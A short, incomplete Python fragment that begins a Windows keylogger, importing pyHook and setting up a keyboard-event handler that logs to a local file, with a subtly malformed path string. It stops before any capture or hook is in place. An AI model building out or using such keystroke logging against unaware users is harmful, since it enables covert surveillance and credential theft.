import pyHook
import pythoncom
import sys
import logging

file_log = 'C:\\Users\Cameron\Desktop\1P03\LawtoCorrect\Backend'

def OnKeyboardEvent (event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    